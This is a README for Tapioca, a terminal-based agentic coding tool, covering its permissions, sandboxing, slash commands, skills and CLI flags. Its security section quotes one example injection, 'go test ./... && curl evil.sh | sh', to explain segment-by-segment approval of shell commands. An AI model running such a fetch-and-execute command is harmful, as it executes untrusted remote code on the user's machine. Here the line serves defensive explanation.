# Tapioca

An agentic coding TUI: a model that reads, writes and runs things in your
project, with every mutating call behind a permission prompt — and the state of
the session on screen while it works.

![Tapioca fixing operator precedence in a parser](assets/demo.gif)

**[Documentation →](https://juacamole.github.io/tapioca-docs/guide/what-is-tapioca)**

```sh
go build -o tapioca .   # or: nix run .
tapioca                 # in any project directory
```

Needs Go 1.26.5+. Runs on Linux, macOS and Windows — the shell tools want a
POSIX `sh`, so on Windows use Git for Windows or WSL.

It also installs as **`tapio`**, because Shopify's `tapioca` gem claims the same
name. Both are the same program; `nix build .` produces both.

With [Ollama](https://ollama.com) or a
[llama.cpp](https://github.com/ggml-org/llama.cpp) `llama-server` running it
works out of the box — no key, no account, no network beyond localhost.
Anthropic, Bedrock, Vertex AI, Azure OpenAI, Gemini and any OpenAI-compatible
server also work; switching is one `/model`.

## What it does differently

**The session's cost is on screen, not behind a command.** Context fill, spend,
the plan, recent tool calls with their arguments, git status and changed files
stay visible while the agent streams. Pick the panels with `/panels`, dock them
on any side; changes are written back to your config with your comments intact.

**A threat model, not a permission prompt.** [SECURITY.md](SECURITY.md) says
what is enforced *and what is not*. Deny rules hold in every mode including
`bypass`; compound commands are approved segment by segment, so `go test*`
can't be ridden in on by `go test ./... && curl evil.sh | sh`; provider keys are
scrubbed from every subprocess. With `sandbox = true`, bash runs under
bubblewrap with `$HOME` replaced by an empty tmpfs — `.ssh` isn't gated, it's
absent. The working directory is treated as untrusted too: a cloned repo's
`.git/config` can name programs, and those keys are pinned away before any git
command runs.

**Agents that actually run at once.** Each has its own provider, model, prompt,
history and stats. `/fork` branches a conversation without losing the original;
`spawn_agent` delegates to a subagent whose noise never reaches your context.

**Safety nets for real work.** Edit a file yourself and the agent's stale writes
are refused until it re-reads. What it writes is checked by your language
servers, with errors attached to the tool result. `/rewind` restores the
worktree from a checkpoint. `[[hooks]]` runs your own commands around tool
calls — and one that exits non-zero blocks the call.

**It respects the terminal.** Drag to select and it copies on release. `ascii`
glyphs render in any terminal and font; `mono` drops color; `contrast` is
colorblind-safe Okabe-Ito. Default keybinds avoid `alt`, so they work on macOS.

**One binary, both directions.** `tapioca --acp` speaks the
[Agent Client Protocol](https://agentclientprotocol.com), so Zed and other ACP
editors drive this build. It also *drives* other agents — configure one under
`[[agents.external]]` and `/connect` gives it a tab, with every command it wants
to run going through your permission rules first.

It reads `AGENTS.md`, `CLAUDE.md`, `GEMINI.md` and `CRUSH.md`, so instructions
written for other tools work unchanged.

## Slash commands

| | |
|---|---|
| **Models** | `/model [provider:]name` · `/effort [level]` · `/thinking` · `/connect [agent]` · `/mcp [server]` |
| **Context** | `/goal text` · `/btw note` · `/remember fact` · `/ask question` · `/systemprompt` · `/skills [name]` |
| **The turn** | `/steer text` · `/queue` · `/regen` · `/edit` · `/compact` · `/clear` |
| **Agents** | `/agent [name]` · `/fork` · `/tools` |
| **Files** | `/cd dir` · `/diff` · `/rewind [n\|id]` · `/checkpoints` |
| **Sessions** | `/new` · `/save` · `/resume [id]` · `/quit` |
| **Setup** | `/settings` · `/permissions` · `/panels` · `/theme` · `/glyphs` · `/wordmark` |
| **Output** | `/verbose` · `/zen` · `/log` · `/help` |

`/connect` disconnects with `ctrl+d`. `/ask` answers from context without
touching the conversation; `/steer` stops the current turn and sends yours next,
keeping the work it already did.

Drop a markdown file in `~/.config/tapioca/commands/` or `.tapioca/commands/`
and its name becomes a command of your own. Every command is documented in the
[reference](https://juacamole.github.io/tapioca-docs/reference/slash-commands).

## Skills

A command is a macro you fire; a skill is a capability the model reaches for. A
`SKILL.md` in `~/.config/tapioca/skills/<name>/` or `.tapioca/skills/<name>/`
declares a description — and only that is in context, one line — until the model
judges it relevant and loads the instructions and whatever files ship beside
them. [More →](https://juacamole.github.io/tapioca-docs/guide/skills)

## CLI

```sh
tapioca -c                          # continue the most recent session
tapioca -r [id]                     # resume (no id opens a picker)
tapioca -p "fix the failing test"   # headless: one prompt, print, exit
tapioca --permission-mode plan      # plan | manual | auto | bypass
tapioca --sandbox                   # confine bash with bubblewrap
tapioca --acp                       # serve ACP on stdio, for editors
```

`shift+enter` inserts a line break, `ctrl+j` where the terminal lacks keyboard
enhancements. Full flags, configuration and keybinds are in the
[documentation](https://juacamole.github.io/tapioca-docs/reference/cli).

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). Security issues: read
[SECURITY.md](SECURITY.md) first — it documents the threat model and how to
report privately.

MIT licensed.
